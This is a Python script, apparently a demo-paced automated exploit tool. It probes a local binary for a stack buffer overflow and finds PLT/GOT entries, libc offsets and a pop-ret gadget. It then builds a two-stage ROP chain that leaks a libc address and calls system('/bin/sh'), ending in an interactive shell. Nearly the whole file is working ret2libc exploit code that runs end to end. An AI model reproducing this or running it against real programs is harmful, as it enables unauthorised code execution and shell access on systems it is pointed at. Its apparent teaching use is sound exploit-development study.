from find_segfault import find_segfault
from bin_handler import Bin_handler
from evil_payload_handler import Evil_payload_handler
from string_handler import search_string_in_file
import os
import time
import threading
from os import path
from gadget_finder import Gadget_finder
import subprocess
from generate_random_payload import Fifo_handler
from pwn import process
import click

# def output_reader(proc):
#     for line in iter(proc.stdout.readline, b''):
#         print('Got line: {0}'.format(line.decode('utf-8')))
#         print('Hex: {0}'.format(line.decode('utf-8').hex()))

# accept filename as parameter

def has_null_bytes(hexstr):
    if "00" in hexstr:
        return True
    return False

def cleanup(start_payload_name):
    try:
        if len(start_payload_name) > 0:
            os.unlink(start_payload_name)
    except:
        print("Unable to delete payload file during cleanup", start_payload_name)

program_name = click.prompt('Please enter a program name', type=str)
print("")
print("Program name is", program_name)

# check if the file exists in working directory
try:
    if path.exists(program_name) == False:
        exit()
except:
    print("Error checking for binary file of program")
    exit()

print("Please select method of probing for buffer overflow:")
print("1 - probe with payload as argument")
print("2 - probe with payload as filename")
print("3 - probe with payload as argument and filename")
print("4 - automate probing (default)")

probe_mode = 0
valid_probing_mode = False
while valid_probing_mode == False:
    probe_mode = click.prompt('Method:', type=int, default=4)
    print("")
    if probe_mode in [1,2,3,4]:
        valid_probing_mode = True
    else:
        print('Invalid method, try again')

# TODO: get maximum payload size, we need to figure out how to automate this part
max_payload_size = 0
valid_payload_size = False
while valid_payload_size == False:
    max_payload_size = click.prompt('Please enter maximum payload size', type=int, default=600)
    print("")
    if max_payload_size > 0:
        valid_payload_size = True

print("Payload size is", max_payload_size)

# if mode 1 and 3 are selected
# actually, nothing to do here

# get filename if 2 and 3 are selected
start_payload_name = ''
if probe_mode == 2 or probe_mode == 3:
    start_payload_name = click.prompt('Please enter name of payload file', type=str)

click.confirm('[Demo pause] Press any key to continue checking for segfault', default="y")
print("")

has_segfault, segfault_address, segfault_offset, effective_payload_file, effective_address_of_string = find_segfault(program_name, 32, probe_mode, max_payload_size, start_payload_name)

if len(effective_payload_file) > 0:
    start_payload_name = effective_payload_file

if has_segfault:
    print("Segfault found at", segfault_address)
    print("Segfault offset is", segfault_offset)
else:
    # TODO: what if segfault not found?
    print("No segfault found")
    exit()

print("")
click.confirm('[Demo pause] Press any key to continue', default="y")
print("")

print("")
print("Checking if libc is used")
print("---------------------------------------------")

# check for libc
b_handler = Bin_handler(program_name)
if b_handler.has_libc() == True:
    print("Found libc at", b_handler.libc_path)

else:
    print("Libc not found")
    exit()

print("")
click.confirm('[Demo pause] Press any key to continue', default="y")
print("")

print("")
print("Searching for static addresses")
print("---------------------------------------------")

# check for plt sections, we want printf or puts that will be used for leaking the libc address
# for GOT address, we are interested .got.plt section of "readelf -S binary_file"
found_printf, printf_plt, printf_got = b_handler.search_plt_and_got_function(program_name, 'printf')
found_printf = False
found_puts, puts_plt, puts_got = b_handler.search_plt_and_got_function(program_name, 'puts')

if found_printf:
    print("Found address of printf@plt", printf_plt)
    print("Found address of printf@got", printf_got)

if found_puts:
    print("Found address of puts@plt", puts_plt)
    print("Found address of puts@got", puts_got)

# check for address of important functions
system_found, system_address_offset = b_handler.search_function(b_handler.libc_path, 'system')
printf_found, printf_address_offset = b_handler.search_function(b_handler.libc_path, 'printf')
puts_found, puts_address_offset = b_handler.search_function(b_handler.libc_path, 'puts')
exit_found, exit_address_offset = b_handler.search_function(b_handler.libc_path, 'exit')
sstart_found, sstart_address = b_handler.search_asm_function(program_name, '_start')

print("Found address of _start", sstart_address)

if has_null_bytes(sstart_address):
    print("WARNING, address contains NULL bytes, will make a minor change")
    sstart_address_int = int(sstart_address, 16)
    sstart_address_int = sstart_address_int + 4
    sstart_address = hex(sstart_address_int)[2:]

print("")
click.confirm('[Demo pause] Press any key to continue', default="y")
print("")

print("")
print("Searching for address offsets")
print("---------------------------------------------")

print("Offset of system", system_address_offset)
print("Offset of printf", printf_address_offset)
print("Offset of puts", puts_address_offset)
print("offset of exit", exit_address_offset)
print("")

click.confirm('[Demo pause] Press any key to continue searching for gadget', default="y")
print("")

print("")
print("Searching for gadget address (pop e?x; ret;)")
print("---------------------------------------------")

# find any gadget pop register; ret;
executable_sections = b_handler.get_executable_sections(program_name)
gfinder = Gadget_finder(program_name)
found_gadget = False
gadget_address = ''
popregret_address = ''
for esection in executable_sections:
    print("Checking executable section", esection)
    esec_add_int = int(executable_sections[esection][0], 16)
    esec_start_int = int(executable_sections[esection][1], 16)
    esec_end_int = esec_start_int + int(executable_sections[esection][2], 16)
    found_gadget, gadget_address = gfinder.find("0x([a-f0-9]+):\spop\se\w?x;\s?(0x[a-f0-9]+):\s?ret\s?;", esec_start_int, esec_end_int)
    if found_gadget:
        popregret_address = esec_add_int + int(gadget_address, 16)
        print("Found gadget inside", esection, "section with address", hex(popregret_address))
        break

print("")
click.confirm('[Demo pause] Press any key to continue', default="y")
print("")

print("")
print("Searching for /bin/sh address offset")
print("---------------------------------------------")

# find bin/sh string address, by first getting the libx's rodata where it is likely to be
found_rodata, rodata_address, rodata_start, rodata_end = b_handler.search_binary_section(b_handler.libc_path, '.rodata')
rodata_address_int =  int(rodata_address, 16)
rodata_start_int = int(rodata_start, 16)
rodata_end_int =  rodata_start_int + int(rodata_end, 16)

binsh_offset_int = search_string_in_file(b_handler.libc_path, "/bin/sh", rodata_start_int, rodata_end_int)
binsh_offset_hex = hex(rodata_address_int + binsh_offset_int)

print("Offset of /bin/sh", binsh_offset_hex)

# put together the first payload that will call printf@plt(printf@got) or puts@plt(puts@got)
# print("")
# click.confirm('[Demo pause] Press any key to continue', default="y")
# print("")

evil = Evil_payload_handler(max_payload_size, segfault_offset)
#evil.add_content(0xdeadbeef)
if found_printf:
    evil.add_content(int(printf_plt, 16))
else:
    evil.add_content(int(puts_plt, 16))

# random address for testing purpose
if effective_address_of_string > 0:
# test_str_offset_int = search_string_in_file(program_name, start_payload_name)
    
    # make payload first print random string, then print got address
     # gadget to pop
    evil.add_content(popregret_address)
    evil.add_content(effective_address_of_string)

    if found_printf:
        evil.add_content(int(printf_plt, 16))
    else:
        evil.add_content(int(puts_plt, 16))

    evil.add_content(popregret_address)
    #evil.add_content(effective_address_of_string)
    if found_printf:
        evil.add_content(int(printf_got, 16))
    else:
        evil.add_content(int(puts_got, 16))
    
    # put address to start of the program
    #evil.add_content(0xdeadbeef)
    evil.add_content(int(sstart_address, 16))
    evil.add_content(effective_address_of_string)
    evil.add_content(effective_address_of_string)
    evil.add_content(effective_address_of_string)
    #evil.add_content(effective_address_of_string)
    #evil.add_content(0)
    
else :
    # TODO: we need to find a string that has an address that can be used
    print("")

# use fifo pipe instead
evil.write_to_plaintext("debug_" + program_name + "_payload_1")

try:
    os.unlink(start_payload_name)
except:
    pass
os.mkfifo(start_payload_name)

print("")
click.confirm('[Demo pause] Press any key to begin exploit', default="y")
print("")

print("")
print("Starting exploit")
print("---------------------------------------------")

proc = process([f'./{program_name}', start_payload_name])

phandle = open(f"./{start_payload_name}",'wb',0)
phandle.write(evil.get_payload())
print("First payload is written")

tempstr = start_payload_name + "\n"
print("Reading outputs from until the following bytes are received:", tempstr.encode('utf-8'))
recv_str = proc.recvuntil(delims=tempstr.encode('utf-8'), timeout=10)
# recv_str = proc.recvline()
print("Receive from program with first payload: {}".format(recv_str))
# recv_str = proc.recvline()
# print("Receive from program with first payload: {}".format(recv_str))

# begin second stage of exploit
# click.confirm('[Demo pause] Press any key to continue', default="y")
# print("")

if len(recv_str) == 0:
    print("exploit failed")
    cleanup(start_payload_name)
    exit()

recvdata = proc.recvline()

if found_printf:
    print("Full leak", recvdata)
    print("len of string used", len(start_payload_name))
    #len_to_ignore = len(start_payload_name)
    len_to_ignore = 0
    # TODO: need additional if for 64 bit
    len_to_ignore_end = 4+len_to_ignore
    recvdata = recvdata[len_to_ignore:len_to_ignore_end] 
else:
    # proc.recvline() # ignore this line
    # recvdata = proc.recvline()
    print("Full leak", recvdata)
    len_to_ignore = 0
    # TODO: need additional if for 64 bit
    len_to_ignore_end = 4+len_to_ignore
    recvdata = recvdata[len_to_ignore:len_to_ignore_end] 
    recvdata = recvdata[:4] 
#print("Leaked address: {}".format(recvdata.hex()))
#print(recvdata.hex())
leaked_address_bytes = bytearray.fromhex(recvdata.hex())
if found_printf:
    print("Leaked address of printf:", hex(int.from_bytes(leaked_address_bytes, byteorder='little')))
else:
    print("Leaked address of puts:", hex(int.from_bytes(leaked_address_bytes, byteorder='little')))

print("")
click.confirm('[Demo pause] Press any key to continue calculating libc address', default="y")
print("")

#proc.recvline()

#calculate all addresses
libc_base_address = 0

if found_printf:
    libc_base_address = int.from_bytes(leaked_address_bytes, byteorder='little') - int(printf_address_offset, 16)
else:
    libc_base_address = int.from_bytes(leaked_address_bytes, byteorder='little') - int(puts_address_offset, 16)

print("Calculated libc address:", hex(libc_base_address)) 

final_system_address = libc_base_address + int(system_address_offset, 16)
final_binsh_address = libc_base_address + int(binsh_offset_hex, 16)
final_exit_address = libc_base_address + int(exit_address_offset, 16)

print("Function system address:", hex(final_system_address))
print("String /bin/sh address:", hex(final_binsh_address))
print("Function exit address:", hex(final_exit_address))

second_evil = Evil_payload_handler(max_payload_size, segfault_offset)
second_evil.add_content(final_system_address)
second_evil.add_content(final_exit_address)
second_evil.add_content(final_binsh_address)

print("Second Payload written to pipe")

phandle.write(second_evil.get_payload())
second_evil.write_to_plaintext("debug_" + program_name + "_payload_2")
# ready to get interactive after sending

print("")
click.confirm('[Demo pause] Press any key to get interactive shell', default="y")
print("")

try:
    proc.interactive()
except:
    print("")

# cleanup
cleanup(start_payload_name)